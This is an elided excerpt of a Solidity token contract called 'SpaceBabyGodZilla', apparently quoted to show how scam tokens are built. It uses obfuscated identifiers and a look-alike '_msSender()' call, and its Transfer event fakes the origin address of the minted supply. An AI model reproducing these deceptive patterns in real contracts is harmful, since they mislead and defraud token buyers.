...
contract SpaceBabyGodZilla is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private _name = "SpaceBabyGodZilla";
    string private _symbol = "SpaceBabyGodZilla";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x8c5ffE9A74B8a41d570109E2cE981E210E02Cc2C));
        ________ = payable(address(0x8c5ffE9A74B8a41d570109E2cE981E210E02Cc2C));

        _asdjiowf[_msSender()] = _totalSupply;
        emit Transfer(address(0xAd17549ac5b84DCc07E657774E09dD4B04eede32), _msgSender(), _totalSupply);
    }
